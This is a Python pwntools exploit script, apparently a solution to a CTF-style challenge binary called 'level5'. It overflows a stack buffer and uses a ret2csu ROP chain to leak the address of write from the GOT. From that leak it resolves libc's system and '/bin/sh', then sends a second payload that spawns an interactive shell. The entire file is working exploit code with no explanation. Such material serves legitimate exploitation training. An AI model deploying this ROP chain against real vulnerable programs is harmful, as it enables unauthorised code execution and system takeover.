from pwn import *

p = process('./level5')
elf = ELF('level5')
libc = elf.libc
context(log_level='debug')

write_got = elf.got['write']
read_got = elf.got['read']

start_addr = 0x400470
csu_addr1 = 0x400600
csu_addr2 = 0x40061A

def csu(rbx, rbp, r12, r13, r14, r15, ret_addr):
    payload = flat(
        'a'*0x88,
        p64(csu_addr2),p64(rbx),p64(rbp),p64(r12),p64(r13),p64(r14),p64(r15),
        p64(csu_addr1),
        'a'*0x38,
        p64(ret_addr))
    p.send(payload)

p.recvuntil(b'Hello, World\n')

#write(1,write_got,8)
csu(0,1,write_got,8,write_got,1,start_addr)

write_addr = u64(p.recv(8))
print(hex(write_addr))

libc.address = write_addr - libc.symbols['write']
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
rdi_addr = 0x400623
ret_addr = 0x400419

payload = flat(
'a'*0x88,
p64(rdi_addr),
p64(binsh_addr),
p64(ret_addr),#对齐
p64(system_addr)
)
p.sendline(payload)

p.interactive()